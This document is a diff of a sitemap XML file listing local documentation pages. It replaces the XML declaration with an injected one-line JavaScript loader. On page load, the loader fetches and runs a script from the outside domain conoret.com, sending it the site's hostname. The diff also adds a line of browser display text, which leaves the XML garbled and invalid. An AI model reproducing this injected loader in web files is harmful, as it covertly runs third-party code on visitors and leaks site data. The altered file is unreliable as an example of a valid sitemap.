@@ -1,4 +1,5 @@
-<?xml version="1.0" encoding="UTF-8"?>
+window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
+This XML file does not appear to have any style information associated with it. The document tree is shown below.
 <urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
 <url>
 <loc>http://localhost:4000/docs/edge%20case/2009/05/15/edge-case-nested-and-mixed-lists.html</loc>
